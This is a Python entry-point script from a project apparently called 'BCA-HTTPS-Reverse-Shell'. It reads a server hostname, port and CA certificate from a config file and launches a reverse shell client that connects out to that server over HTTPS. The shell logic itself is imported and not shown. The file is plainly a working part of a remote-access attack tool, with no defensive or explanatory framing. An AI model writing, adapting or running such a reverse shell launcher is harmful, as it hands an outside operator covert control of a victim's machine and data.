#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

"""This module executes the Reverse Shell Client from settings parsed 
from the shell.cfg file found in this same directory."""

from configparser import ConfigParser
from pathlib import Path

from src.client import Client


shell_cfg = Path(__file__).parent.joinpath("shell.cfg")
(cfg := ConfigParser()).read(shell_cfg)
server_cfg = cfg["SERVER"]
certs_cfg = cfg["CERTIFICATES"]

Client(
    server_address=server_cfg.get("hostname"),
    server_port=server_cfg.getint("port"),
    ca_file=certs_cfg.get("ca-cert")
).execute()
